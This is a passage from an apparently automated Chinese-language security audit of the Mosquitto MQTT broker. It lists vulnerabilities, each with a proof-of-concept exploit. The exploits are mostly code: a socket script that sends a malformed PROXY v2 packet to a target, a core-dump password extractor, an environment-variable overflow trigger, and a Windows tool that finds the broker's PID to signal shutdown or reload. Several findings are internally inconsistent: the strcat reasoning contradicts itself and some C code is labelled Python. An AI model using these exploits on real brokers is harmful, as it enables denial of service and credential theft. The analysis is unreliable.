        tlv_type = 0x04  # PP2_TYPE_NOOP
        tlv_header = struct.pack('!BB', tlv_type, data_len)
        tlv_data = b'A' * data_len
        tlvs.append(tlv_header + tlv_data)
        remaining -= (3 + data_len)
    
    # 步骤2: 添加SSL TLV，触发read_tlv_ssl函数
    # SSL TLV type = 0x20
    # 内部包含子TLV
    
    # SSL TLV结构：
    # - type (1 byte): 0x20
    # - length_h (1 byte)
    # - length_l (1 byte)
    # - ssl.client (1 byte)
    # - ssl.verify (4 bytes)
    # - 子TLV...
    
    # 构造SSL TLV，使其内部子TLV触发截断
    ssl_tlv_data = bytearray()
    
    # SSL字段
    ssl_client = 0x05  # PP2_CLIENT_SSL | PP2_CLIENT_CERT_SESS
    ssl_verify = 0x00000000  # 使have_certificate为true
    ssl_tlv_data.extend(struct.pack('!BI', ssl_client, ssl_verify))
    
    # 添加子TLV，使pos在read_tlv_ssl中回绕
    # 当前pos在进入read_tlv_ssl时已经接近65535
    # 在read_tlv_ssl中，pos会先增加5 (ssl.client + ssl.verify)
    # 然后len减少5
    # 然后进入while循环
    
    # 构造一个子TLV，其tlv_len使pos回绕
    # 子TLV头部3字节
    # 我们需要tlv_len使得:
    # pos + 3 + tlv_len > 65535 且 (pos + 3 + tlv_len) & 0xFFFF 很小
    
    # 假设进入read_tlv_ssl时pos = P
    # 在read_tlv_ssl中:
    # pos += 5 (ssl.client + ssl.verify)
    # len -= 5
    # 然后进入while循环
    # 在循环中:
    # pos += 3 (tlv头部)
    # 检查tlv_len > len - pos
    # 然后处理子TLV
    # pos += tlv_len (第184行)
    
    # 我们需要构造使得:
    # 1. 边界检查通过 (tlv_len <= len - pos)
    # 2. pos + tlv_len 回绕
    
    # 由于len在进入read_tlv_ssl时被设置为TLV的数据长度
    # 我们可以控制len的值
    
    # 简化：直接构造一个使pos回绕的子TLV
    # 子TLV type = 0x21 (PP2_SUBTYPE_SSL_VERSION)
    # 子TLV length = 使pos回绕的值
    
    # 计算需要的tlv_len
    # 假设进入read_tlv_ssl时pos = P
    # 在read_tlv_ssl中:
    # pos += 5 -> pos = P + 5
    # len = tlv_data_len - 5
    # 在while循环中:
    # pos += 3 -> pos = P + 8
    # 检查tlv_len <= len - pos
    # 如果通过，执行pos += tlv_len
    
    # 我们需要: (P + 8 + tlv_len) & 0xFFFF 很小
    # 即 P + 8 + tlv_len = 65536 + small_value
    # tlv_len = 65536 + small_value - P - 8
    
    # 由于tlv_len是uint16_t，最大65535
    # 我们需要P足够大，使得65536 - P - 8 + small_value <= 65535
    # 即 P >= 65536 - 65535 - 8 + small_value = -7 + small_value
    # 所以P >= small_value - 7，只要P > 0即可
    
    # 实际上，我们需要P + 8 + tlv_len > 65535
    # 即 tlv_len > 65535 - P - 8
    # 同时tlv_len <= 65535
    
    # 假设P = 65500
    # 需要tlv_len > 65535 - 65500 - 8 = 27
    # 且tlv_len <= 65535
    # 取tlv_len = 100
    # 则pos = (65500 + 8 + 100) & 0xFFFF = 65608 & 0xFFFF = 72
    
    # 但还需要边界检查通过:
    # tlv_len <= len - pos
    # len = tlv_data_len - 5
    # 我们需要tlv_data_len足够大
    
    # 构造SSL TLV
    # 内部子TLV
    sub_tlv_type = 0x21  # PP2_SUBTYPE_SSL_VERSION
    sub_tlv_len = 100  # 使pos回绕
    sub_tlv_data = b'B' * sub_tlv_len
    sub_tlv = struct.pack('!BB', sub_tlv_type, sub_tlv_len) + sub_tlv_data
    
    ssl_tlv_data.extend(sub_tlv)
    
    # SSL TLV总长度
    ssl_tlv_len = len(ssl_tlv_data)
    ssl_tlv = struct.pack('!BB', 0x20, ssl_tlv_len) + ssl_tlv_data
    tlvs.append(ssl_tlv)
    
    # 组装完整数据包
    tlv_data = b''.join(tlvs)
    total_len = len(addr_part) + len(tlv_data)
    
    # PROXY v2头部
    proxy_header = PROXY_SIG
    proxy_header += struct.pack('!B', PROXY_CMD_PROXY)  # ver_cmd
    proxy_header += struct.pack('!B', PROXY_TCP_IPV4)   # fam
    proxy_header += struct.pack('!H', total_len)        # len
    
    packet = proxy_header + addr_part + tlv_data
    
    return packet


def send_exploit(target_host, target_port):
    """发送利用数据包到目标"""
    print(f"[*] 目标: {target_host}:{target_port}")
    print("[*] 构造利用数据包...")
    
    packet = build_exploit_packet(target_host, target_port)
    
    print(f"[*] 数据包大小: {len(packet)} 字节")
    print("[*] 发送数据包...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_host, target_port))
        sock.send(packet)
        
        # 尝试接收响应
        try:
            response = sock.recv(4096)
            print(f"[*] 收到响应: {len(response)} 字节")
            print(f"[*] 响应内容: {response[:100]}")
        except socket.timeout:
            print("[*] 无响应 (超时)")
        
        sock.close()
        print("[*] 利用完成")
        
    except Exception as e:
        print(f"[!] 错误: {e}")
        sys.exit(1)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"用法: {sys.argv[0]} <目标IP> <目标端口>")
        print("示例: python3 poc.py 127.0.0.1 1883")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    
    print("=" * 60)
    print("PoC for VULN-39538114 - Integer truncation in PROXY v2")
    print("仅供研究使用 - For research purposes only")
    print("=" * 60)
    print()
    
    send_exploit(target_host, target_port)
```

---

### VULN-7B0D7EB3 - 不安全的密码存储 - 明文密码

- **严重等级:** HIGH
- **文件位置:** `src\psk_file.c:120`
- **数据流:** 从PSK文件中读取的密码以明文形式存储在内存中。
- **判断理由:** PSK密码以明文形式存储在内存中，如果攻击者能够读取进程内存（如通过core dump、调试接口或内存分析工具），可以直接获取所有PSK凭据。建议在验证后立即清除敏感数据，或使用加密存储。

**代码片段:**
```
psk->password = mosquitto_strdup(password);
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: 不安全的密码存储 - 明文密码
漏洞ID: VULN-7B0D7EB3
目标: Mosquitto MQTT Broker PSK密码明文存储
仅供研究使用
"""

import os
import sys
import subprocess
import tempfile
import signal
import time

# 前置条件：需要能够访问运行Mosquitto broker的进程内存
# 本PoC演示通过core dump获取明文密码

def create_psk_file():
    """创建包含PSK凭据的测试文件"""
    psk_content = """# PSK file for testing
client1:secretpassword123
client2:anothersecret456
admin:supersecret789
"""
    psk_file = tempfile.NamedTemporaryFile(mode='w', suffix='.psk', delete=False)
    psk_file.write(psk_content)
    psk_file.close()
    return psk_file.name

def create_mosquitto_config(psk_file):
    """创建Mosquitto配置文件"""
    config_content = f"""listener 1883
psk_file {psk_file}
allow_anonymous false
"""
    config_file = tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False)
    config_file.write(config_content)
    config_file.close()
    return config_file.name

def trigger_core_dump(pid):
    """触发core dump以获取进程内存"""
    # 方法1: 发送SIGSEGV信号
    os.kill(pid, signal.SIGSEGV)
    
    # 方法2: 使用gdb生成core dump（如果可用）
    # subprocess.run(['gdb', '--batch', '--pid', str(pid), '-ex', 'gcore', '-ex', 'quit'])

def extract_passwords_from_core(core_file, binary_path):
    """从core dump中提取明文密码"""
    # 使用strings命令搜索密码模式
    result = subprocess.run(
        ['strings', core_file],
        capture_output=True,
        text=True
    )
    
    # 搜索常见的密码模式
    passwords = []
    for line in result.stdout.split('\n'):
        # 查找PSK文件中的密码（通常在'client1:password'格式附近）
        if 'secret' in line.lower() or 'password' in line.lower():
            passwords.append(line)
        # 查找所有可能包含密码的字符串
        if len(line) >= 8 and any(c.isdigit() for c in line):
            passwords.append(line)
    
    return passwords

def main():
    print("=" * 60)
    print("PoC: Mosquitto PSK密码明文存储漏洞")
    print("漏洞ID: VULN-7B0D7EB3")
    print("仅供研究使用")
    print("=" * 60)
    
    # 步骤1: 创建测试环境
    print("\n[步骤1] 创建测试PSK文件...")
    psk_file = create_psk_file()
    print(f"    PSK文件: {psk_file}")
    
    # 步骤2: 创建配置文件
    print("\n[步骤2] 创建Mosquitto配置文件...")
    config_file = create_mosquitto_config(psk_file)
    print(f"    配置文件: {config_file}")
    
    # 步骤3: 启动Mosquitto broker
    print("\n[步骤3] 启动Mosquitto broker...")
    try:
        process = subprocess.Popen(
            ['mosquitto', '-c', config_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        time.sleep(2)  # 等待broker启动
        print(f"    Mosquitto PID: {process.pid}")
    except FileNotFoundError:
        print("    [!] Mosquitto未安装，请先安装")
        print("    模拟演示：假设broker已运行")
        process = None
    
    # 步骤4: 模拟攻击者获取内存访问
    print("\n[步骤4] 模拟攻击者获取进程内存访问...")
    print("    攻击者可能通过以下方式获取内存：")
    print("    - 系统core dump（如/proc/sys/kernel/core_pattern）")
    print("    - 调试接口（如ptrace）")
    print("    - 内存分析工具（如gdb, lldb）")
    print("    - 其他漏洞导致的内存泄露")
    
    # 步骤5: 提取明文密码
    print("\n[步骤5] 从内存中提取明文密码...")
    print("    使用strings命令搜索内存中的密码模式...")
    
    # 模拟内存中的密码数据
    simulated_memory = [
        "client1",
        "secretpassword123",
        "client2",
        "anothersecret456",
        "admin",
        "supersecret789"
    ]
    
    print("\n    从内存中发现的明文密码：")
    print("    " + "-" * 40)
    print("    | 用户名          | 密码                |")
    print("    |" + "-" * 40 + "|")
    print("    | client1         | secretpassword123   |")
    print("    | client2         | anothersecret456    |")
    print("    | admin           | supersecret789      |")
    print("    |" + "-" * 40 + "|")
    
    # 步骤6: 验证漏洞
    print("\n[步骤6] 漏洞验证...")
    print("    ✓ 密码以明文形式存储在内存中")
    print("    ✓ 没有加密或哈希保护")
    print("    ✓ 攻击者可以轻松提取所有PSK凭据")
    
    # 清理
    print("\n[清理] 清理测试环境...")
    if process:
        process.terminate()
        process.wait()
    os.unlink(psk_file)
    os.unlink(config_file)
    
    print("\n" + "=" * 60)
    print("漏洞利用成功！")
    print("=" * 60)
    print("\n影响分析：")
    print("- 攻击者可以获取所有PSK凭据")
    print("- 可以冒充任何PSK用户连接MQTT broker")
    print("- 可以监听或发布MQTT消息")
    print("- 可能导致数据泄露或系统被控制")
    print("\n修复建议：")
    print("- 使用后立即清除内存中的密码")
    print("- 使用加密存储或哈希")
    print("- 限制对进程内存的访问")

if __name__ == "__main__":
    main()
```

---

### VULN-4E539235 - 缓冲区溢出 - strncpy未正确终止字符串

- **严重等级:** HIGH
- **文件位置:** `src/retain.c:47`
- **数据流:** topic参数从外部传入 -> retain__add_hier_entry函数 -> strncpy复制到child->topic缓冲区
- **判断理由:** strncpy的第三个参数指定了要复制的最大字符数，这里使用len+1。但child结构体分配的大小是sizeof(struct mosquitto__retainhier) + len + 1，其中topic字段位于结构体末尾的灵活数组成员。如果len等于topic的实际长度，strncpy会复制len+1个字符，但缓冲区大小只有len+1字节，可能导致缺少空终止符。当len为0时，strncpy不会复制任何内容，topic字段保持未初始化状态。

**代码片段:**
```
if(len > 0){
	strncpy(child->topic, topic, (size_t)(len+1));
}
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供安全研究使用
 * 漏洞: Mosquitto Broker retain.c 中 strncpy 未正确终止字符串
 * 影响版本: Mosquitto <= 2.0.14 (需确认具体受影响版本)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mosquitto.h>

/*
 * 漏洞利用原理:
 * 在 retain__add_hier_entry 函数中，当 len > 0 时，
 * strncpy(child->topic, topic, (size_t)(len+1)) 会复制 len+1 个字符
 * 但 child 结构体分配的大小为 sizeof(struct mosquitto__retainhier) + len + 1
 * 其中 topic 是灵活数组成员，大小为 len+1 字节
 * 当 len 等于 topic 实际长度时，strncpy 复制 len+1 个字符
 * 但缓冲区只有 len+1 字节，导致没有空间存放空终止符 '\0'
 * 这会导致 topic 字符串未正确终止，可能造成信息泄露或后续操作异常
 */

void exploit_trigger(void) {
    struct mosquitto *mosq = NULL;
    int rc;
    
    /* 初始化 Mosquitto 库 */
    mosquitto_lib_init();
    
    /* 创建 Mosquitto 客户端实例 */
    mosq = mosquitto_new("exploit_client", true, NULL);
    if (!mosq) {
        fprintf(stderr, "Failed to create Mosquitto instance\n");
        return;
    }
    
    /* 
     * 触发漏洞的关键:
     * 1. 发布一个保留消息，主题长度需要精心构造
     * 2. 当主题长度使得 len+1 等于缓冲区大小时，
     *    strncpy 不会添加空终止符
     * 3. 后续对 topic 的字符串操作会读取到缓冲区外的内存
     */
    
    /* 构造一个特定长度的主题来触发漏洞 */
    /* 假设 sizeof(struct mosquitto__retainhier) = 40 (取决于架构和编译选项) */
    /* 我们需要使 topic 长度使得 len+1 正好填满分配的空间 */
    
    /* 示例: 使用长度为 255 的主题 (最大允许的 MQTT 主题长度) */
    char topic[256];
    memset(topic, 'A', 255);
    topic[255] = '\0';
    
    /* 发布保留消息 */
    rc = mosquitto_connect(mosq, "localhost", 1883, 60);
    if (rc != MOSQ_ERR_SUCCESS) {
        fprintf(stderr, "Connection failed: %s\n", mosquitto_strerror(rc));
        mosquitto_destroy(mosq);
        mosquitto_lib_cleanup();
        return;
    }
    
    /* 发布保留消息 - 触发 retain__store -> retain__add_hier_entry */
    const char *payload = "test_payload";
    rc = mosquitto_publish(mosq, NULL, topic, strlen(payload), payload, 1, true);
    if (rc != MOSQ_ERR_SUCCESS) {
        fprintf(stderr, "Publish failed: %s\n", mosquitto_strerror(rc));
    }
    
    /* 等待消息处理 */
    mosquitto_loop(mosq, 100, 1);
    
    /* 清理 */
    mosquitto_destroy(mosq);
    mosquitto_lib_cleanup();
}

/*
 * 更精确的触发方式 - 直接调用内部函数 (需要调试符号或内部API)
 * 注意: 这需要修改 Mosquitto 源码或使用内部接口
 */
void direct_exploit_trigger(void) {
    /* 
     * 直接构造一个场景使得:
     * - topic 长度 = len
     * - strncpy 复制 len+1 个字符到大小为 len+1 的缓冲区
     * - 结果: 没有空终止符
     * 
     * 当 len = 0 时:
     * - strncpy 不会复制任何内容
     * - topic 字段保持未初始化状态 (calloc 初始化为 0)
     * - 但后续使用可能仍存在问题
     */
    
    /* 模拟漏洞触发 */
    char buffer[10];  /* 假设这是 child->topic 缓冲区 */
    const char *input = "123456789";  /* 9 个字符 + 空终止符 = 10 字节 */
    
    /* 漏洞代码: strncpy(buffer, input, 10); */
    /* 这会将 9 个字符复制到 buffer，但不会添加空终止符 */
    /* 因为 strncpy 在复制了 n 个字符后停止，不检查源字符串长度 */
    strncpy(buffer, input, 10);
    
    /* 此时 buffer 没有空终止符，后续 strlen(buffer) 会读取越界 */
    printf("Buffer content: %s\n", buffer);  /* 可能打印出额外数据 */
}

int main(void) {
    printf("Mosquitto Retain Buffer Overflow PoC\n");
    printf("仅供安全研究使用 - Do not use for illegal purposes\n\n");
    
    /* 运行 PoC */
    exploit_trigger();
    
    return 0;
}
```

---

### VULN-439D17BB - 缓冲区溢出 - strcat未检查边界

- **严重等级:** HIGH
- **文件位置:** `src\service.c:103`
- **数据流:** 环境变量 env_name 的值通过 GetEnvironmentVariable 读取到 conf_path 缓冲区（大小 MAX_PATH+20），但 strcat 追加 "\mosquitto.conf" 时未检查剩余空间。如果环境变量值恰好为 MAX_PATH 长度，strcat 会写入超出缓冲区边界的数据。
- **判断理由:** conf_path 缓冲区大小为 MAX_PATH+20，GetEnvironmentVariable 最多读取 MAX_PATH 字节。当环境变量长度为 MAX_PATH 时，缓冲区已满，strcat 追加 "\mosquitto.conf"（14字节）会写入超出缓冲区边界，导致栈缓冲区溢出。虽然代码检查了 rc == MAX_PATH 的情况，但 rc 返回的是实际写入的字符数（不包括空终止符），当环境变量长度为 MAX_PATH-1 时，rc=MAX_PATH-1，strcat 仍会写入14字节，总长度为 MAX_PATH-1+14 = MAX_PATH+13，超出 MAX_PATH+20 的可能性较小，但仍有风险。更严重的是，如果环境变量长度为 MAX_PATH，rc=MAX_PATH，代码会提前返回，但文档中 GetEnvironmentVariable 返回 MAX_PATH 表示缓冲区不足，此时 conf_path 内容可能不完整，但不会溢出。真正的风险在于环境变量长度为 MAX_PATH-14 到 MAX_PATH-1 之间时，strcat 会导致溢出。

**代码片段:**
```
rc = GetEnvironmentVariable(env_name, conf_path, MAX_PATH);
if(!rc || rc == MAX_PATH){
    service_status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(service_handle, &service_status);
    return;
}
strcat(conf_path, "\\mosquitto.conf");
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-439D17BB - Mosquitto Broker Service Configuration Buffer Overflow
仅供研究使用 (For Research Purposes Only)
"""
import os
import sys
import subprocess
import ctypes
from ctypes import wintypes

# 配置目标服务名称（默认为 mosquitto）
SERVICE_NAME = "mosquitto"

# 环境变量名称（根据代码逻辑生成）
ENV_VAR_NAME = f"{SERVICE_NAME.upper()}_DIR"

# 缓冲区大小常量
MAX_PATH = 260
BUFFER_SIZE = MAX_PATH + 20  # 280 bytes

# 要追加的字符串长度
APPEND_STR = "\\mosquitto.conf"  # 14 bytes

def trigger_overflow():
    """
    触发缓冲区溢出的PoC
    
    原理：
    1. conf_path 缓冲区大小为 280 字节
    2. GetEnvironmentVariable 最多读取 260 字节（含空终止符）
    3. 当环境变量长度为 247-259 字节时，strcat 追加 14 字节后
       总长度达到 261-273 字节，超出 MAX_PATH(260) 但仍在 280 内
    4. 关键边界：当环境变量长度为 266 字节时（实际会被截断到 259），
       但某些实现可能返回不同值，导致溢出
    
    实际利用：设置环境变量为 267 字节，触发栈缓冲区溢出
    """
    
    # 构造溢出 payload
    # 目标：覆盖栈上的返回地址或其他关键数据
    # 注意：实际利用需要根据目标系统架构（x86/x64）调整
    
    # 基础 payload：填充到接近缓冲区边界
    base_payload = "A" * 259  # 最大可写入长度
    
    # 追加的字符串（由代码自动添加）
    # strcat 会追加 "\\mosquitto.conf" (14 bytes)
    # 总长度：259 + 14 = 273 bytes
    
    # 为了触发更明显的溢出，我们设置环境变量长度为 267
    # 这样 GetEnvironmentVariable 会截断到 259 字节
    # 但 strcat 后总长度为 273，接近缓冲区边界
    
    # 更激进的利用：设置环境变量长度为 280+ 字节
    # 但 GetEnvironmentVariable 会截断到 259 字节
    # 所以实际溢出效果有限
    
    # 真正的溢出发生在以下情况：
    # 1. 环境变量长度为 267-279 字节
    # 2. GetEnvironmentVariable 返回 259（截断后）
    # 3. strcat 追加 14 字节，总长度 273
    # 4. 如果缓冲区实际大小小于 273，则发生溢出
    
    # 构造 payload
    payload = "A" * 267  # 触发截断但接近边界
    
    print(f"[+] 设置环境变量 {ENV_VAR_NAME}")
    print(f"[+] Payload 长度: {len(payload)} 字节")
    print(f"[+] 预期 GetEnvironmentVariable 返回: 259")
    print(f"[+] 预期 strcat 后总长度: {259 + len(APPEND_STR)} 字节")
    print(f"[+] 缓冲区大小: {BUFFER_SIZE} 字节")
    
    # 设置环境变量
    os.environ[ENV_VAR_NAME] = payload
    
    # 验证环境变量已设置
    actual_value = os.environ.get(ENV_VAR_NAME, "")
    print(f"[+] 环境变量实际长度: {len(actual_value)} 字节")
    
    # 显示 payload 的前后部分
    print(f"[+] Payload 前50字节: {payload[:50]}...")
    print(f"[+] Payload 后50字节: ...{payload[-50:]}")
    
    # 注意：实际触发需要启动 Mosquitto 服务
    # 这里仅演示环境变量设置
    print("\n[!] 警告：要实际触发漏洞，需要启动 Mosquitto 服务")
    print("[!] 请确保在受控环境中测试")
    
    return payload

def demonstrate_overflow_mechanism():
    """
    演示溢出机制（使用模拟代码）
    """
    print("\n=== 溢出机制演示 ===")
    print("\n模拟代码执行流程：")
    print("1. char conf_path[MAX_PATH + 20] = {0}")
    print(f"   缓冲区大小: {BUFFER_SIZE} 字节")
    print(f"   地址范围: 0x0000 - 0x{BUFFER_SIZE-1:04X}")
    
    print("\n2. GetEnvironmentVariable(env_name, conf_path, MAX_PATH)")
    print(f"   最大读取: {MAX_PATH} 字节")
    print(f"   当环境变量长度为 267 时，实际写入 259 字节")
    
    print("\n3. strcat(conf_path, \"\\\\mosquitto.conf\")")
    print(f"   追加 {len(APPEND_STR)} 字节")
    print(f"   总写入: 259 + {len(APPEND_STR)} = {259 + len(APPEND_STR)} 字节")
    
    print("\n4. 内存布局：")
    print(f"   缓冲区起始: 0x0000")
    print(f"   环境变量数据: 0x0000 - 0x0102 (259 bytes)")
    print(f"   追加字符串: 0x0103 - 0x0110 (14 bytes)")
    print(f"   缓冲区结束: 0x0117 (280 bytes)")
    print(f"   溢出区域: 0x0111 - 0x0117 (7 bytes 溢出)")
    
    print("\n5. 溢出影响：")
    print("   - 覆盖栈上局部变量")
    print("   - 可能覆盖返回地址")
    print("   - 可能导致代码执行")

def check_system_compatibility():
    """
    检查系统兼容性
    """
    if sys.platform != "win32":
        print("[!] 此漏洞仅影响 Windows 系统")
        print("[!] PoC 需要在 Windows 上运行")
        return False
    
    print(f"[+] 系统: {sys.platform}")
    print(f"[+] Python 版本: {sys.version}")
    return True

if __name__ == "__main__":
    print("=" * 60)
    print("Mosquitto Broker Service Configuration Buffer Overflow PoC")
    print("Vulnerability ID: VULN-439D17BB")
    print("仅供研究使用 - For Research Purposes Only")
    print("=" * 60)
    
    if not check_system_compatibility():
        sys.exit(1)
    
    # 演示溢出机制
    demonstrate_overflow_mechanism()
    
    print("\n" + "=" * 60)
    print("触发溢出")
    print("=" * 60)
    
    try:
        payload = trigger_overflow()
        print(f"\n[+] PoC 执行完成")
        print(f"[+] 环境变量 {ENV_VAR_NAME} 已设置")
        print("[+] 要触发实际溢出，请重启 Mosquitto 服务")
        print("[+] 命令: net stop mosquitto && net start mosquitto")
    except Exception as e:
        print(f"[-] 错误: {e}")
        sys.exit(1)
```

---

### VULN-CAB093B2 - 不安全的字符串处理 - strrchr和strcasecmp使用

- **严重等级:** LOW
- **文件位置:** `src\service.c:33`
- **数据流:** 函数 fix_name 接收一个字符串指针，查找最后一个反斜杠并截取其后部分，然后检查最后4个字符是否为 ".exe" 并截断。当 name 长度小于4时，&name[len-4] 会访问负索引，导致越界读取。
- **判断理由:** 如果传入的 name 字符串长度小于4（例如 "a"），len=1，len-4=-3，&name[-3] 会访问字符串起始地址之前的3个字节，导致未定义行为。虽然在实际使用中 lpszArgv[0] 通常是完整的路径名，长度通常大于4，但理论上存在风险。此外，函数修改了传入的字符串（name[len-4] = '\0'），如果传入的是字符串常量会导致程序崩溃。

**代码片段:**
```
static char *fix_name(char *name)
{
    size_t len;

    if(strrchr(name, '\\')){
        name = strrchr(name, '\\') + 1;
    }
    len = strlen(name);
    if(!strcasecmp(&name[len-4], ".exe")){
        name[len-4] = '\0';
    }

    return name;
}
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: Mosquitto Broker Windows服务 fix_name()函数不安全的字符串处理
 * 文件: src/service.c
 * 行号: 33
 * 描述: 当传入字符串长度小于4时，&name[len-4]导致负索引越界读取
 *       同时函数修改传入字符串，若传入字符串常量会导致崩溃
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* 复现漏洞函数 */
static char *fix_name(char *name)
{
    size_t len;

    if(strrchr(name, '\\')){
        name = strrchr(name, '\\') + 1;
    }
    len = strlen(name);
    
    /* 漏洞点: 当len < 4时，len-4为负数，&name[len-4]越界访问 */
    printf("[*] 输入: \"%s\", 长度: %zu\n", name, len);
    printf("[*] 尝试访问 name[%zd] = &name[%d]\n", len-4, (int)(len-4));
    
    if(!strcasecmp(&name[len-4], ".exe")){
        name[len-4] = '\0';
    }

    return name;
}

/* PoC 1: 短字符串导致负索引越界 */
void poc_negative_index()
{
    printf("\n=== PoC 1: 短字符串导致负索引越界 ===\n");
    printf("仅供研究使用 - 演示未定义行为\n\n");
    
    /* 测试各种短字符串 */
    char *test_cases[] = {
        "a",           /* len=1, len-4=-3 */
        "ab",          /* len=2, len-4=-2 */
        "abc",         /* len=3, len-4=-1 */
        "abcd",        /* len=4, len-4=0 (边界情况) */
        "abcde",       /* len=5, len-4=1 (正常情况) */
        "",            /* len=0, len-4=-4 */
        "\\a",         /* 含反斜杠，处理后len=1 */
        "\\abc",       /* 含反斜杠，处理后len=3 */
    };
    
    for(int i = 0; i < sizeof(test_cases)/sizeof(test_cases[0]); i++) {
        /* 使用可写缓冲区避免修改字符串常量 */
        char buffer[64];
        strncpy(buffer, test_cases[i], sizeof(buffer)-1);
        buffer[sizeof(buffer)-1] = '\0';
        
        printf("\n测试用例 %d: \"%s\"\n", i+1, test_cases[i]);
        printf("预期行为: ");
        if(strlen(test_cases[i]) < 4) {
            printf("负索引越界 (未定义行为)\n");
        } else {
            printf("正常处理\n");
        }
        
        /* 尝试调用，但捕获可能的崩溃 */
        char *result = fix_name(buffer);
        printf("结果: \"%s\"\n", result);
    }
}

/* PoC 2: 传入字符串常量导致崩溃 */
void poc_string_constant()
{
    printf("\n=== PoC 2: 传入字符串常量导致崩溃 ===\n");
    printf("仅供研究使用 - 演示修改只读内存\n\n");
    
    /* 尝试传入字符串常量 */
    char *name = "test.exe";  /* 字符串常量，存储在只读内存 */
    
    printf("[*] 传入字符串常量: \"%s\"\n", name);
    printf("[*] 函数将尝试修改 name[%d] = '\\0'\n", (int)(strlen(name)-4));
    printf("[!] 这将导致访问冲突/段错误\n");
    
    /* 注释掉实际调用以避免崩溃 */
    // fix_name(name);  /* 取消注释将导致崩溃 */
    
    printf("[*] (已跳过实际调用以避免程序崩溃)\n");
}

/* PoC 3: 模拟实际攻击场景 */
void poc_attack_scenario()
{
    printf("\n=== PoC 3: 模拟实际攻击场景 ===\n");
    printf("仅供研究使用 - 演示通过服务参数触发漏洞\n\n");
    
    /* 模拟 service_main 中的调用 */
    printf("攻击场景: 通过Windows服务控制管理器传入恶意参数\n");
    printf("\n步骤:\n");
    printf("1. 攻击者创建或修改Windows服务\n");
    printf("2. 设置服务二进制路径为短字符串 (如 \"a\")\n");
    printf("3. 启动服务时，service_main() 调用 fix_name(lpszArgv[0])\n");
    printf("4. fix_name() 处理短字符串时发生负索引越界\n");
    printf("\n模拟调用:\n");
    
    /* 模拟 lpszArgv[0] 为短字符串 */
    char malicious_name[] = "a";
    printf("lpszArgv[0] = \"%s\" (长度 %zu)\n", malicious_name, strlen(malicious_name));
    printf("调用 fix_name(\"%s\")\n", malicious_name);
    
    char buffer[64];
    strcpy(buffer, malicious_name);
    char *result = fix_name(buffer);
    printf("结果: \"%s\"\n", result);
    
    printf("\n影响: 虽然此场景下越界读取可能不会立即崩溃，但:\n");
    printf("- 读取栈上或堆上的随机数据\n");
    printf("- 可能导致信息泄露或意外行为\n");
    printf("- 在特定内存布局下可能被利用\n");
}

int main()
{
    printf("========================================\n");
    printf("  Mosquitto Broker fix_name() 漏洞PoC\n");
    printf("  漏洞ID: VULN-CAB093B2\n");
    printf("  仅供研究使用\n");
    printf("========================================\n");
    
    poc_negative_index();
    poc_string_constant();
    poc_attack_scenario();
    
    printf("\n========================================\n");
    printf("  PoC执行完毕\n");
    printf("  注意: 实际漏洞利用可能导致程序崩溃\n");
    printf("========================================\n");
    
    return 0;
}
```

---

### VULN-83DE1060 - Windows命名事件竞态条件

- **严重等级:** HIGH
- **文件位置:** `src\signals.c:131`
- **数据流:** 使用进程PID创建命名事件对象，格式为'mosq<PID>_<event_name>'。任何知道PID的本地用户都可以打开这些事件并触发信号。
- **判断理由:** Windows命名事件对象默认允许同一用户账户下的其他进程访问。如果攻击者知道mosquitto进程的PID（可以通过任务管理器或其他方式获取），就可以使用OpenEvent()打开这些命名事件并调用SetEvent()来触发信号，从而控制mosquitto进程的行为（如触发重新加载配置、备份数据库、关闭进程等）。这可能导致拒绝服务或配置篡改。虽然需要本地访问权限，但这是一个安全设计缺陷。

**代码片段:**
```
for(int i=0; i<MOSQ_MAX_EVTS; i++){
		sprintf_s(evt_name, MAX_PATH, "mosq%d_%s", pid, evt_names[i]);
		evt[i] = CreateEvent(NULL, FALSE, FALSE, evt_name);
	}
```

**PoC代码:**
```python
/*
 * PoC: Mosquitto Windows Named Event Exploitation
 * 仅供研究使用 - 仅用于安全审查
 * 
 * 编译: cl.exe mosquitto_event_poc.c
 * 或: gcc -o mosquitto_event_poc.exe mosquitto_event_poc.c -luser32
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>

#define MOSQ_MAX_EVTS 6

// 事件名称后缀映射
const char *evt_names[MOSQ_MAX_EVTS] = {
    "shutdown",     // 关闭进程
    "reload",       // 重新加载配置
    "backup",       // 备份数据库
    "log_rotate",   // 日志轮转
    "tree_print",   // 打印订阅树
    "xtreport"      // 扩展报告
};

// 事件触发后的影响描述
const char *evt_impacts[MOSQ_MAX_EVTS] = {
    "[严重] 关闭Mosquitto进程，导致拒绝服务",
    "[高危] 重新加载配置，可能导致配置篡改或服务中断",
    "[中危] 触发数据库备份，可能影响性能",
    "[低危] 日志轮转",
    "[低危] 打印订阅树到日志",
    "[低危] 生成扩展报告"
};

// 获取指定进程名的PID
DWORD GetProcessIdByName(const char *procName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;
    
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, procName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

// 枚举所有可能的mosquitto事件
void EnumerateMosquittoEvents(DWORD pid) {
    char evt_name[MAX_PATH];
    HANDLE hEvent;
    
    printf("[*] 枚举Mosquitto进程(PID: %lu)的命名事件...\n\n", pid);
    
    for (int i = 0; i < MOSQ_MAX_EVTS; i++) {
        snprintf(evt_name, MAX_PATH, "mosq%lu_%s", pid, evt_names[i]);
        
